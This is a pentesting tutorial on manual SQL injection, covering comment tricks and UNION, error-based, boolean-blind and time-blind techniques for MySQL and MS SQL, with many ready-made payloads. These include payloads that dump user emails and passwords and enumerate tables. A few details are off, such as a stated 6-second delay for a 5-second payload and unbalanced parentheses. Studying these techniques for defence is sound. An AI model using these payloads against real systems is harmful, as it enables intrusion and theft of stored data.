# Manual techniques and best practices for exploiting SQL injections

* A good recommendation to use when exploiting a SQL injection vulnerability is using comments. Comments out any other SQL code that follows the injection point:
  * `#`: the hash symbol.

    ```sql
    SELECT name, description, price FROM products WHERE status='new' or '1'='1' #' AND taxable = true;
    ```

  * `-- `: two hyphens followed by a space.

    ```sql
    SELECT name, description, price FROM products WHERE status='new' or '1'='1' -- ' AND taxable = true;
    ```

    Since a comment itself is composed of two hyphens and a space, it's good practice to add a third hyphen at the end (i.e. `-- -`) because most browsers automatically remove trailing spaces in the URL:

    ```url
    products.php?status=new' or '1'='1'; -- -
    ```

## In-band SQL injections

* Due to the fact that for In-band SQL injections the result of the exploitation is included directly in the response page from the vulnerable web application, these types of SQL injection are usually the ones that require the least effort to exploit.

### UNION-based SQL injections

* When exploiting UNION-based SQL injections, the number of fields in the second `SELECT` statement should match the **number of fields** in the first (and original) statement. Consider the SQL payload `new' UNION SELECT username, email, password FROM users; -- -` for the following example:

  ```sql
  SELECT name, description, brand FROM products WHERE status='new' UNION SELECT username, email, password FROM users; -- -' AND taxable = true;
  ```

  * To achieve this without knowing the number of fields that are originally selected, start by selecting a single field and then increase the number of fields until a valid query is built:

    ```sql
    UNION SELECT NULL; -- -
    ```

    ```sql
    UNION SELECT NULL, NULL; -- -
    ```

    ```sql
    UNION SELECT NULL, NULL, NULL; -- -
    ```

* Depending on the DBMS, the **field types** of the second `SELECT` statement in a `UNION` context must match the ones in the first statement. Keep in mind that some fields selected in the SQL query may not be included in the output page, but they are still part of the query.

  * To achieve this, start by replacing `NULL` fields with representative data types:

    ```sql
    UNION SELECT 'a', NULL, NULL; -- -
    ```

    ```sql
    UNION SELECT 'a', 1, NULL; -- -
    ```

    ```sql
    UNION SELECT 'a', 1, 'a'; -- -
    ```

* Use the `UNION ALL` operator to avoid the effect of an eventual `DISTINCT` clause in the original web application query.
* Finally, to successfully perform the injection, it's necessary to find a way **to know or infer the database structure** in terms of tables and columns names.

### Error-based SQL injections

* The goal here is to force the DBMS to display an error including sensitive information. For instance, a simple SQL payload like `new' OR user_name()=1;-- -`, which attempts to convert a string value (i.e. the current database user) to integer, could do the job:

  ```sql
  SELECT name, description, brand FROM products WHERE status='new' OR user_name()=1; -- - AND taxable = true;
  ```

* Let's see more examples of some payloads for specific DBMSs that can allow to retrieve database versions from the errors themselves.

#### Using CAST in MS SQL server

* Injection payload:

  ```sql
  new' or 1 in (SELECT TOP 1 CAST (@@version as varchar(4096)); -- -
  ```

  Potential error obtained on the output page:

  ```
  [Microsoft][SQL Server Native Client 10.0][SQL Server] Conversion failed when converting the varchar value 'Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0 (x64) Jun 28 2020 08:36:30 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor)' to data type int.
  ```

* Injection payload to get the `email` field value of the first record in the `users` table for the `ecommercedb` database:

  ```sql
  new' or 1 in (SELECT TOP 1 CAST (email as varchar(4096)) FROM ecommercedb..users; -- -
  ```

#### Using concat() and GROUP BY in MySQL

* Injection payload:

  ```sql
  new' or 1 in (SELECT count(*), concat(version(),floor(rand(0)*2)) as x FROM information_schema.tables GROUP BY x); -- -
  ```

  Potential error obtained on the output page:

  ```
  ERROR 1062 (23000): Duplicate entry '5.5.43-0+deb7u11' for key 'group_key'
  ```

* Injection payload to get all the tables from the `ecommercedb` database:

  ```sql
  new' AND (SELECT 1 FROM (SELECT count(*), concat((SELECT distinct(table_name) FROM information_schema.tables WHERE table_schema="ecommercedb" LIMIT 1,1)," - ", FLOOR(RAND(0)*2)) B FROM information_schema.tables GROUP BY B) C) #
  ```

* Injection payload to get the `email` field value of the first record in the `users` table for the `ecommercedb` database:

  ```sql
  cars' AND (SELECT 1 FROM (SELECT count(*), concat((SELECT email FROM ecommercedb.users limit 0,1)," - ", FLOOR(RAND(0)*2)) B FROM information_schema.tables GROUP BY B) C) #
  ```

## Inference/Blind SQL injections

* A major difference between In-band or Error-based vs Blind SQL injections is the number of requests required to be performed for the latter (and the time consumed accordingly).
* That's the reason why it's hard to perform manual exploitation of Blind SQL injection vulnerabilities. Instead, pentesters tend to build their own Blind SQLi exploitation scripts or use an automated tool like [sqlmap][1].

### Boolean-based Blind SQL injections

* The objective here is to ask the database `TRUE` or `FALSE` questions and determine the answer based on the application response (e.g. it changes the text on the web page if the condition is `TRUE` vs if it's `FALSE`).
* For this purpose, the type of questions to be asked can be as follows:
  * Does the first record in the `username` field of the `Users` table have a length of 3 characters?
    * If not, does it have a length of 4? of 5? of 6?
  * Is the first letter of that username an "a"?
    * If true, continue with the second letter of the username.
    * If false, ask for the next letter of the alphabet until true.
* Let's see as an example some payloads for specific DBMSs that are useful to perform this type of queries.

#### Using length() and ascii() in MySQL

* Let's try to know the length of a field:

  ```sql
  ' or (length((SELECT password FROM users WHERE id=1)) > 5 )
  ```

  As a reminder:

  * `length()` returns the length of the string.

* Once the length of a field is known, move on to guessing the first letter:

  ```sql
  ' or (ascii(substring((SELECT password FROM users WHERE id=1),1,1)) > 97 )
  ```

  As a reminder:

  * `ascii()` returns the ASCII value of the character.

#### Using user() and substring() in MySQL

* Let's try to find out the first letter of current database username:

  ```sql
  ' or substr(user(), 1, 1) = 'a
  ```

  Until the query is not `TRUE`, keep trying letters:

  ```sql
  ' or substr(user(), 1, 1) = 'b
  ```

  As a reminder:
  
  * `user()` returns the name of the current user using the database.
  * `substring()` returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length.

* Once the first letter is found, move on to the second one:

  ```sql
  ' or substr(user(), 2, 1) = 'a
  ```

### Time-based Blind SQL injections

* In this case, time is used to infer a `TRUE` condition from a `FALSE` condition.
* Let's look directly at some practical payloads for specific DBMSs.

#### Using waitfor delay in MS SQL

* If `TRUE`, the DBMS will delay for 6 seconds:

  ```sql
  if (SELECT user) = 'ecommerce' waitfor delay '0:0:5
  ```

#### Using sleep() and benchmarck() in MySQL

* If `TRUE`, the DBMS will delay for 10 seconds:

  ```sql
  select if((SELECT database()="ecommercedb"), sleep(10), null); -- -
  ```

  ```sql
  select if((SELECT version() like "5%"), sleep(10), null); -- -
  ```

* It will perform `MD5(1)` function 10000000 times if the `if` clause yields `TRUE`:

  ```sql
  if exists (SELECT * FROM users WHERE username = 'johndoe') BENCHMARK(10000000, MD5(1))
  ```

[1]: https://sqlmap.org/
